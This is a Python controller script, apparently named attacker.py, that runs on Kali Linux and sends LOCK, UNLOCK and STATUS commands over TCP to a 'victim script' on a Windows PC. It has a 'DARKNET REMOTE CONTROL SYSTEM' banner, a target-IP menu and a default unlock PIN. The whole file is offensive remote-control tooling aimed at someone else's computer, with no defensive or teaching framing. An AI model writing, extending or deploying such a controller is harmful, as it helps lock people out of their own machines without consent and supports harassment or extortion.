# attacker.py
# Run this on Kali Linux to control Windows PC

import socket
import sys
import os
import time
import getpass

# ------------- BANNER -------------
os.system("clear")
print(r"""
██████╗  █████╗ ██████╗ ██╗  ██╗███╗   ██╗███████╗████████╗
██   ██╗██╔══██╗██╔══██╗██║ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
██   ██╔███████║██████╔╝█████╔╝ ██╔██╗ ██║█████╗     ██║   
██╔══██╗██╔══██║██╔══██╗██╔═██╗ ██║╚██╗██║██╔══╝     ██║   
██████║ ██║  ██║██║  ██║██║  ██╗██║ ╚████║███████╗   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

            ★ DARKNET REMOTE CONTROL SYSTEM ★
              LOCK ↔ UNLOCK TOGGLE READY
""")

# ------------- CONFIGURATION -------------
# Change this to your Windows PC IP
WINDOWS_IP = "192.168.1.102"  # Your Windows PC IP
PORT = 9095
DEFAULT_PIN = "1234"  # Default PIN
# ----------------------------------------

def send_command(command):
    """Send command to Windows PC"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((WINDOWS_IP, PORT))
        sock.send(command.encode())
        
        # Receive response
        response = sock.recv(1024).decode()
        sock.close()
        return response
        
    except ConnectionRefusedError:
        return "ERROR: Connection refused. Is victim script running on Windows?"
    except socket.timeout:
        return "ERROR: Connection timeout. Check IP and network."
    except Exception as e:
        return f"ERROR: {str(e)}"

def get_windows_ip():
    """Get Windows IP from user"""
    ip = input(f"\n[?] Enter Windows IP [{WINDOWS_IP}]: ").strip()
    if ip:
        return ip
    return WINDOWS_IP

def lock_system():
    """Lock Windows PC"""
    print("\n[!] Sending LOCK command...")
    response = send_command("LOCK")
    print(f"[✓] Response: {response}")
    
    if response == "LOCKING":
        print("\n" + "="*50)
        print("🔒 SYSTEM IS NOW LOCKED!")
        print("="*50)
        print("\n[!] To unlock, use:")
        print("    python attacker.py unlock")
        print("    OR")
        print("    python attacker.py unlock <pin>")
        print("="*50)
    elif response == "ALREADY_LOCKED":
        print("\n[!] System is already locked!")
    else:
        print(f"\n[!] {response}")

def unlock_system(pin=None):
    """Unlock Windows PC with PIN"""
    if not pin:
        pin = getpass.getpass("[?] Enter PIN to unlock: ")
    
    print(f"\n[!] Sending UNLOCK with PIN command...")
    response = send_command(f"UNLOCK_PIN:{pin}")
    print(f"[✓] Response: {response}")
    
    if response == "UNLOCKED":
        print("\n" + "="*50)
        print("🔓 SYSTEM IS NOW UNLOCKED!")
        print("="*50)
        print("\n[!] System ready for next LOCK command")
    elif response == "WRONG_PIN":
        print("\n" + "="*50)
        print("❌ WRONG PIN! System remains locked.")
        print("="*50)
    elif response == "ALREADY_UNLOCKED":
        print("\n[✓] System was already unlocked!")
    else:
        print(f"\n[!] {response}")

def check_status():
    """Check system status"""
    print("\n[!] Checking status...")
    response = send_command("STATUS")
    
    if response == "LOCKED":
        print("\n" + "="*50)
        print("🔒 SYSTEM STATUS: LOCKED")
        print("="*50)
    elif response == "UNLOCKED":
        print("\n" + "="*50)
        print("🔓 SYSTEM STATUS: UNLOCKED")
        print("="*50)
    else:
        print(f"\n[!] {response}")

def interactive_mode():
    """Interactive mode with menu"""
    print("\n" + "="*70)
    print("🎮 INTERACTIVE CONTROL MODE - LOCK/UNLOCK TOGGLE")
    print("="*70)
    print("\n[!] Commands are togglable - Lock then Unlock then Lock again")
    
    while True:
        print("\n" + "-"*50)
        print("📡 COMMANDS:")
        print("  1. LOCK              - Lock Windows PC")
        print("  2. UNLOCK (PIN)      - Unlock with PIN (will ask)")
        print("  3. UNLOCK QUICK      - Unlock with default PIN")
        print("  4. STATUS            - Check system status")
        print("  5. CHANGE TARGET IP  - Change Windows IP")
        print("  6. QUIT              - Exit")
        print("-"*50)
        
        choice = input("\n[>] Select option (1-6): ").strip()
        
        if choice == "1":
            lock_system()
            
        elif choice == "2":
            unlock_system()  # Will ask for PIN
            
        elif choice == "3":
            unlock_system(DEFAULT_PIN)  # Use default PIN
            
        elif choice == "4":
            check_status()
            
        elif choice == "5":
            new_ip = input("\n[?] Enter new Windows IP: ").strip()
            if new_ip:
                global WINDOWS_IP
                WINDOWS_IP = new_ip
                print(f"[✓] Target IP changed to: {WINDOWS_IP}")
            else:
                print("[!] IP unchanged")
                
        elif choice == "6":
            print("\n[!] Exiting...")
            break
        else:
            print("\n[!] Invalid option!")

# ------------- MAIN -------------
if __name__ == "__main__":
    # Get Windows IP
    windows_ip = get_windows_ip()
    WINDOWS_IP = windows_ip
    
    print(f"\n[✓] Target IP: {WINDOWS_IP}")
    print(f"[✓] Target Port: {PORT}")
    print(f"[✓] Default PIN: {DEFAULT_PIN}")
    
    print("\n" + "="*70)
    print("🎯 COMMAND LINE OPTIONS (TOGGLE READY):")
    print("  python attacker.py lock           - Lock Windows PC")
    print("  python attacker.py unlock         - Unlock with default PIN")
    print("  python attacker.py unlock <pin>   - Unlock with specific PIN")
    print("  python attacker.py status         - Check status")
    print("  python attacker.py menu           - Interactive menu")
    print("="*70)
    print("\n[!] LOCK/UNLOCK toggling works:")
    print("    LOCK → UNLOCK → LOCK → UNLOCK (cycle repeats)")
    print("="*70)
    
    # Check command line arguments
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        
        if cmd == "lock":
            lock_system()
            
        elif cmd == "unlock":
            if len(sys.argv) > 2:
                # Unlock with provided PIN
                unlock_system(sys.argv[2])
            else:
                # Unlock with default PIN
                unlock_system(DEFAULT_PIN)
                
        elif cmd == "status":
            check_status()
            
        elif cmd == "menu":
            interactive_mode()
            
        else:
            print(f"\n[!] Unknown command: {cmd}")
            interactive_mode()
    else:
        # No arguments, show menu
        interactive_mode()
